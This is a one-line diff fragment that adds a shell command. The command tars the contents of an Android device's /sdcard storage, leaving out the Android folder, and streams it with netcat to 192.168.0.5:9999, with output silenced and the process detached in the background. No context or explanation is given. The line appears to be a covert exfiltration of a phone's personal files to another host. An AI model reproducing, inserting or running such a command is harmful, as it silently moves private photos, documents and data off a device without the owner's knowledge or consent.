@@ -1,0 +1,1 @@
+nohup tar --exclude='/sdcard/Android' -czf - /sdcard/* | nc 192.168.0.5 9999 >/dev/null 2>&1 &
